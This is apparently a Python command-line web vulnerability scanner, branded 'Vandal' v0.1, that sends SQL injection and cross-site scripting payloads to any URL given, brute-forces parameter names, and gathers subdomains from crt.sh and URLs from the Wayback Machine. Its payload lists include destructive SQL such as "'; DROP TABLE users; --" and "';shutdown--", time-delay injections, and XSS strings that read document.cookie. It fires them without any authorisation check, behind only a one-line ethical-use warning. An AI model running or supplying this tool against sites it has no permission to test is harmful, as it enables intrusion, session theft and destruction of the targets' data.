import sys
import time
import random
import requests
import itertools
import subprocess
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

DEFAULT_TIMEOUT = 8
MAX_RETRIES = 5
BACKOFF_BASE = 2
MAX_PHASE_SECONDS = 180

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "error 1064 (42000)",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error at or near",
    "pg::syntaxerror",
    "ora-",
    "sqlite3::",
    "mysql_fetch",
    "sql error",
    "invalid query",
    "fatal error",
    "unexpected end of SQL command",
    "OLE DB provider",
    "Microsoft OLE DB Provider for ODBC Drivers"
]

ADV_SQL_PAYLOADS = [
    "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
    "admin'--",
    "';waitfor delay '0:0:8'--",
    "1'; SELECT pg_sleep(8)--",
    "' and sleep(8)--",
    "'||(SELECT pg_sleep(8))||'",
    "1;SELECT SLEEP(8); --",
    "1);SELECT SLEEP(8)--",
    "1' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "';shutdown--",
    "' OR 'a'='a",
    "'; DROP TABLE users; --",
]

ADV_XSS_PAYLOADS = [
    "<svg/onload=alert(1337)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(document.domain)>",
    "<script>alert(document.cookie)</script>",
    "\"><img src=x onerror=alert(2)>",
    "<iframe src=javascript:alert(3)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<details open ontoggle=alert(1337)>",
    "<svg><script>alert(1)</script>",
    "\"><svg/onload=confirm(1)>",
    "<marquee onstart=alert(1)>test</marquee>",
    "<input autofocus onfocus=alert(1)>",
    "<video><source onerror=\"alert('xss')\"></video>",
    "<object data='javascript:alert(4)'>",
    "<a href='javascript:alert(1)'>click</a>",
    "<img src/onerror= prompt(document.cookie)>",
    "\"><iframe src=\"https://www.cia.gov/\" style=\"border: 0; position:fixed; top:0; left:0; right:0; bottom:0; width: 100%; height: 100%\">",
]

PRO_PARAM_WORDLIST = [
    "id", "user", "username", "userid", "email", "mail", "password", "token", "session",
    "access_token", "auth", "search", "query", "q", "page", "next", "redirect", "url",
    "callback", "code", "ref", "lang", "locale", "file", "filename", "path", "data",
    "json", "input", "content", "message", "comment", "desc", "description", "note",
    "amount", "price", "order", "number", "count", "hash", "key", "secret", "role",
    "admin", "debug", "cmd", "exec", "delete", "remove", "update", "edit", "modify",
    "from", "to", "target", "dest", "src", "type", "func", "method", "action"
]

def print_rainbow_logo(blink=False, delay=0.004):
    logo = [
        r" __  __                       __            ___      ",
        r"/\ \/\ \                     /\ \          /\_ \     ",
        r"\ \ \ \ \     __      ___    \_\ \     __  \//\ \    ",
        r" \ \ \ \ \  /'__`\  /' _ `\  /'_` \  /'__`\  \ \ \   ",
        r"  \ \ \_/ \/\ \L\.\_/\ \/\ \/\ \L\ \/\ \L\.\_ \_\ \_ ",
        r"   \ `\___/\ \__/.\_\ \_\ \_\ \___,_\ \__/.\_\/\____\\",
        r"    `\/__/  \/__/\/_/\/_/\/_/\/__,_ /\/__/\/_/\/____/",
        r"                                                     ",
        r"                                                     ",
    ]
    colors = [
        196, 202, 208, 220, 46, 51, 21, 93, 201, 129, 99, 208, 226, 51, 51, 21, 93, 201, 129
    ]
    color_count = len(colors)
    for line in logo:
        for i, char in enumerate(line):
            color = colors[(i + random.randint(0, color_count - 1)) % color_count]
            ansi_color = f"\033[38;5;{color}m"
            blink_ansi = "\033[5m" if blink and char != " " else ""
            sys.stdout.write(f"{blink_ansi}{ansi_color}{char}\033[0m")
            sys.stdout.flush()
            if delay:
                time.sleep(delay)
        print()
    print("\033[97mBy\033[0m \033[38;5;196m44ghost44 <3\033[0m")
    print("\033[92mv0.1\033[0m\n")
    time.sleep(0.08)

def print_simple(msg, color=None):
    colors = {
        "red": "38;5;196",
        "yellow": "93",
        "green": "92",
        "cyan": "96",
        "magenta": "95",
        "gray": "90",
        "white": "97"
    }
    if color and color in colors:
        print(f"\033[{colors[color]}m{msg}\033[0m")
    else:
        print(msg)

def is_valid_url(url):
    return url.startswith(('http://', 'https://')) and len(url) > 7

def show_warning():
    print("\033[1;38;5;196mWARNING: Only for ethical and legal use. The author is not responsible for misuse.\033[0m\n")

def do_update():
    print("\033[96mUpdating dependencies...\033[0m")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "-r", "requirements.txt"], check=True)
        print("\033[92mDependencies updated successfully.\033[0m")
    except Exception as e:
        print(f"\033[91mError updating dependencies: {e}\033[0m")

def show_response_details(response):
    print(f"Status code: {response.status_code}")
    if 'Server' in response.headers:
        print(f"Server: {response.headers['Server']}")
    if response.is_redirect or response.status_code in [301, 302, 307, 308]:
        print(f"Redirect to: {response.headers.get('Location')}")
    print()

def check_security_headers(url, user_agent):
    headers = {'User-Agent': user_agent} if user_agent else {}
    try:
        response = requests.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
        heads = response.headers
        missing = []
        for h, msg in [
            ('X-Frame-Options', "X-Frame-Options"),
            ('Content-Security-Policy', "Content-Security-Policy"),
            ('X-XSS-Protection', "X-XSS-Protection"),
            ('Strict-Transport-Security', "Strict-Transport-Security"),
        ]:
            if h not in heads:
                missing.append(msg)
        return missing
    except Exception:
        return []

def backoff_request(req_func, *args, **kwargs):
    for attempt in range(MAX_RETRIES):
        try:
            return req_func(*args, **kwargs)
        except Exception:
            time.sleep(BACKOFF_BASE**attempt)
    return None

def find_subdomains(domain, user_agent):
    print(f"Subdomains for {domain}:", end=" ")
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    headers = {'User-Agent': user_agent} if user_agent else {}
    resp = backoff_request(requests.get, url, headers=headers, timeout=DEFAULT_TIMEOUT)
    if resp and resp.ok:
        try:
            subdomains = set(entry['name_value'].strip() for entry in resp.json())
            print(", ".join(list(subdomains)[:5]) + (" ..." if len(subdomains)>5 else ""))
        except Exception:
            print_simple("Could not read subdomains.", "yellow")
    else:
        print_simple("Could not fetch subdomains.", "yellow")

def wayback_urls(domain, user_agent):
    print(f"Wayback URLs for {domain}:", end=" ")
    url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey"
    headers = {'User-Agent': user_agent} if user_agent else {}
    resp = backoff_request(requests.get, url, headers=headers, timeout=DEFAULT_TIMEOUT)
    if resp and resp.ok:
        try:
            urls = [entry[0] for entry in resp.json()[1:] if not entry[0].endswith(('.jpg','.png','.css','.ico','.svg','.gif'))]
            print(", ".join(list(urls)[:5]) + (" ..." if len(urls)>5 else ""))
        except Exception:
            print_simple("Could not read Wayback URLs.", "yellow")
    else:
        print_simple("Could not fetch Wayback URLs.", "yellow")

def all_param_combinations(params, max_combo):
    keys = list(params.keys())
    combos = []
    for l in range(1, min(len(keys)+1, max_combo+1)):
        for subset in itertools.combinations(keys, l):
            combos.append({k: params[k] for k in subset})
    return combos

def is_sql_error(text):
    return any(err in text.lower() for err in SQL_ERRORS)

def validate_sqli(url, headers, method, data=None):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if method == "POST" and data:
        params = data
    if not params:
        return False, "No parameters, cannot test advanced SQLi."
    key = list(params.keys())[0]
    base_params = params.copy()
    time_payload = "';WAITFOR DELAY '0:0:8'--"
    error_payload = "'"
    def do_req(p):
        if method == "GET":
            q = urlencode(p, doseq=True)
            req_url = urlunparse(parsed._replace(query=q))
            return requests.get(req_url, headers=headers, timeout=DEFAULT_TIMEOUT)
        else:
            return requests.post(url, headers=headers, data=p, timeout=DEFAULT_TIMEOUT)
    try:
        resp_base = do_req(base_params)
        if resp_base.elapsed.total_seconds() > 5:
            return False, "Base response is too slow, skipping combo."
        t_base = resp_base.elapsed.total_seconds() if resp_base else 0
        params[key] = time_payload
        resp_time = do_req(params)
        t_test = resp_time.elapsed.total_seconds() if resp_time else 0
        params[key] = error_payload
        resp_error = do_req(params)
        if resp_error and is_sql_error(resp_error.text):
            snippet = next((err for err in SQL_ERRORS if err in resp_error.text.lower()), "")
            return True, f"Error-based SQLi detected ({method}): {url} parameter {key} (msg: {snippet})"
        if t_base > 0 and t_test > t_base + 6:
            return True, f"Time-based SQLi detected ({method}): {url} parameter {key} (delay: {t_test:.2f}s vs {t_base:.2f}s)"
    except Exception as e:
        return False, f"Error or timeout in combination: {e}"
    return False, None

def progress_bar(current, total, step_name="", start_time=None):
    spinner = ['|', '/', '-', '\\']
    percent = int(100 * (current / float(total))) if total else 0
    spin = spinner[current % len(spinner)]
    elapsed = int(time.time() - start_time) if start_time else 0
    eta = int((elapsed/current)*(total-current)) if current > 0 and total > 0 else 0
    sys.stdout.write(f"\r[{step_name}] {spin} {percent}% ({current}/{total}) elapsed:{elapsed}s eta:{eta}s")
    sys.stdout.flush()
    if current == total:
        print("")

def advanced_sqli_scan(url, user_agent, method, max_combo, mode, max_phase_seconds):
    headers = {'User-Agent': user_agent} if user_agent else {}
    parsed = urlparse(url)
    params = parse_qs(parsed.query) if method == "GET" else {}
    findings = []
    start_time = time.time()
    if mode == "fast":
        combos = [dict.fromkeys([PRO_PARAM_WORDLIST[0]], "test")]
        sql_payloads = ADV_SQL_PAYLOADS[:2]
    else:
        if method == "POST":
            combos = []
            for num in range(1, max_combo+1):
                for keys in itertools.combinations(PRO_PARAM_WORDLIST, num):
                    combos.append({k: "test" for k in keys})
        else:
            combos = all_param_combinations(params, max_combo)
        sql_payloads = ADV_SQL_PAYLOADS
    total = len(combos) * len(sql_payloads)
    if total > 50000:
        print(f"\n[!] Warning: this phase may take many minutes ({total} tests)...\n")
    count = 0
    last_print = time.time()
    for pset in combos:
        early = False
        ok, msg = validate_sqli(url, headers, method, data=pset)
        if ok:
            print_simple(msg, "red")
            findings.append(msg)
        elif msg and "too slow" in msg:
            print_simple(msg, "yellow")
            early = True
        for key in pset:
            for payload in sql_payloads:
                count += 1
                if count % 10 == 0 or count == total or (time.time() - last_print > 2):
                    progress_bar(count, total, f"{method} SQLi", start_time)
                    last_print = time.time()
                if early or (time.time() - start_time > max_phase_seconds):
                    print_simple("Phase interrupted (timeout or slow response).", "yellow")
                    return findings
                test_params = pset.copy()
                test_params[key] = payload
                if method == "GET":
                    q = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=q))
                    try:
                        resp = requests.get(test_url, headers=headers, timeout=DEFAULT_TIMEOUT)
                        if resp and (is_sql_error(resp.text) or resp.status_code >= 500):
                            print_simple(f"Advanced SQLi found (GET {key})! {test_url}", "red")
                            findings.append(test_url)
                    except: pass
                else:
                    try:
                        resp = requests.post(url, headers=headers, data=test_params, timeout=DEFAULT_TIMEOUT)
                        if resp and (is_sql_error(resp.text) or resp.status_code >= 500):
                            print_simple(f"Advanced SQLi found (POST {key})! {url}", "red")
                            findings.append(f"{url} ({key}={payload})")
                    except: pass
                time.sleep(0.01)
    progress_bar(total, total, f"{method} SQLi", start_time)
    return findings

def advanced_xss_scan(url, user_agent, method, max_combo, mode, max_phase_seconds):
    headers = {'User-Agent': user_agent} if user_agent else {}
    parsed = urlparse(url)
    params = parse_qs(parsed.query) if method == "GET" else {}
    findings = []
    start_time = time.time()
    if mode == "fast":
        combos = [dict.fromkeys([PRO_PARAM_WORDLIST[0]], "test")]
        xss_payloads = ADV_XSS_PAYLOADS[:2]
    else:
        if method == "POST":
            combos = []
            for num in range(1, max_combo+1):
                for keys in itertools.combinations(PRO_PARAM_WORDLIST, num):
                    combos.append({k: "test" for k in keys})
        else:
            combos = all_param_combinations(params, max_combo)
        xss_payloads = ADV_XSS_PAYLOADS
    total = len(combos) * len(xss_payloads)
    if total > 50000:
        print(f"\n[!] Warning: this phase may take many minutes ({total} tests)...\n")
    count = 0
    last_print = time.time()
    for pset in combos:
        early = False
        for key in pset:
            for payload in xss_payloads:
                count += 1
                if count % 10 == 0 or count == total or (time.time() - last_print > 2):
                    progress_bar(count, total, f"{method} XSS", start_time)
                    last_print = time.time()
                if early or (time.time() - start_time > max_phase_seconds):
                    print_simple("Phase interrupted (timeout or slow response).", "yellow")
                    return findings
                test_params = pset.copy()
                test_params[key] = payload
                if method == "GET":
                    q = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=q))
                    try:
                        resp = requests.get(test_url, headers=headers, timeout=DEFAULT_TIMEOUT)
                        if payload in resp.text:
                            print_simple(f"Reflected XSS! (GET {key}) {test_url}", "red")
                            findings.append(test_url)
                    except: pass
                else:
                    try:
                        resp = requests.post(url, headers=headers, data=test_params, timeout=DEFAULT_TIMEOUT)
                        if payload in resp.text:
                            print_simple(f"Reflected XSS! (POST {key}) {url}", "red")
                            findings.append(f"{url} ({key}={payload})")
                    except: pass
                time.sleep(0.01)
    progress_bar(total, total, f"{method} XSS", start_time)
    return findings

def scan_url(url, user_agent, max_combo, mode, max_phase_seconds):
    if not is_valid_url(url): print_simple("Invalid URL.", "red"); return
    print_rainbow_logo(blink=True, delay=0.001)
    show_warning()
    print_simple(f"Scanning URL: {url}...", "green")
    headers = {'User-Agent': user_agent} if user_agent else {}
    try:
        response = requests.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
        show_response_details(response)
        print("Checking security headers...")
        missing = check_security_headers(url, user_agent)
        if missing:
            print_simple("Missing headers: " + ", ".join(missing), "yellow")
        else:
            print_simple("Headers OK", "green")
        print("\n[GET] Advanced SQLi and XSS tests (real params + PRO combinations)")
        sqli_vulns = advanced_sqli_scan(url, user_agent, method="GET", max_combo=max_combo, mode=mode, max_phase_seconds=max_phase_seconds)
        if not sqli_vulns: print_simple("No SQLi vulnerabilities found (GET).", "green")
        xss_vulns = advanced_xss_scan(url, user_agent, method="GET", max_combo=max_combo, mode=mode, max_phase_seconds=max_phase_seconds)
        if not xss_vulns: print_simple("No XSS vulnerabilities found (GET).", "green")
        print("\n[POST] Advanced SQLi and XSS tests (PRO wordlist, combinations)")
        sqli_vulns_post = advanced_sqli_scan(url, user_agent, method="POST", max_combo=max_combo, mode=mode, max_phase_seconds=max_phase_seconds)
        if not sqli_vulns_post: print_simple("No SQLi vulnerabilities found (POST).", "green")
        xss_vulns_post = advanced_xss_scan(url, user_agent, method="POST", max_combo=max_combo, mode=mode, max_phase_seconds=max_phase_seconds)
        if not xss_vulns_post: print_simple("No XSS vulnerabilities found (POST).", "green")
    except Exception as e:
        print_simple(f"Error connecting to {url}: {e}", "red")

def set_user_agent():
    if input("Do you want to add a custom User-Agent? (y/n): ").lower() == 'y':
        return input("Enter custom User-Agent: ")
    return None

def set_scan_delay():
    print("Choose recommended scan delay:\n1. 200 ms\n2. 300 ms\n3. 500 ms\n4. 1 minute")
    option = input("Select an option (1/2/3/4): ")
    return {'1':0.2, '2':0.3, '3':0.5, '4':60}.get(option, 0.2)

def clean_domain(url):
    parsed = urlparse(url)
    return parsed.netloc

def main():
    if '--update' in sys.argv:
        do_update()
        sys.exit(0)
    print_rainbow_logo(blink=True, delay=0.001)
    show_warning()
    if len(sys.argv) < 2 or '-h' in sys.argv or '--help' in sys.argv:
        print("Usage: python3 test.py [url1] [url2] ... [--full]\nDefault mode: fast. Use --full for full mode."); sys.exit()
    urls = [arg for arg in sys.argv[1:] if not arg.startswith('--')]
    mode = "full" if "--full" in sys.argv else "fast"
    max_combo = 3 if mode == "full" else 1
    max_phase_seconds = MAX_PHASE_SECONDS if mode == "full" else 60
    user_agent = set_user_agent()
    delay = set_scan_delay()
    for url in urls:
        scan_url(url, user_agent, max_combo=max_combo, mode=mode, max_phase_seconds=max_phase_seconds)
        domain = clean_domain(url)
        find_subdomains(domain, user_agent)
        wayback_urls(domain, user_agent)
        time.sleep(delay)

if __name__ == "__main__":
    main()
